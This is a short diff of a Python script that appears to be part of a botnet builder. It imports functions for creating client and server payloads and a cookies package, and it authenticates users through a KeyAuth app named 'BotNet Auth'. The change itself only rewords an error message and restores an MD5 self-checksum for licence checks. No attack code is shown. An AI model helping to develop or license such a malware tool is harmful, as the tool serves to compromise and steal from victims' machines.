@@ -34,7 +34,7 @@ try:
     from pystyle import *
     from tkinter import *
     from flask import *
-except: print(f"[-] Required modules not downloaded, please run 'setup.bat' to download modules and run again"); os._exit()
+except: print(f"[-] Missing required modules, please run 'setup.bat' to download modules and run again"); os._exit()
 
 
 
@@ -43,7 +43,7 @@ from util.plugins.common import *
 from colorama import Fore
 from cookies_package import *
 from time import sleep
-import maskpass
+import maskpass, hashlib
 from util.create_files import create_client_payload, create_server_payload
 
 
@@ -51,15 +51,14 @@ from util.create_files import create_client_payload, create_server_payload
 KEYAUTH CONFIGURATION
 '''
 def getchecksum():
-    path = os.path.basename(__file__)
-    # if not os.path.exists(path):
-    #     path = path[:-2] + "exe"
-    # md5_hash = hashlib.md5()
-    # a_file = open(path,"rb")
-    # content = a_file.read()
-    # md5_hash.update(content)
-    # digest = md5_hash.hexdigest()
-    return path
+	path = os.path.basename(__file__)
+	if not os.path.exists(path): path = path[:-2] + "py"
+	md5_hash = hashlib.md5()
+	a_file = open(path,"rb")
+	content = a_file.read()
+	md5_hash.update(content)
+	digest = md5_hash.hexdigest()
+	return digest
 
 keyauthapp = api(
     name = "BotNet Auth",
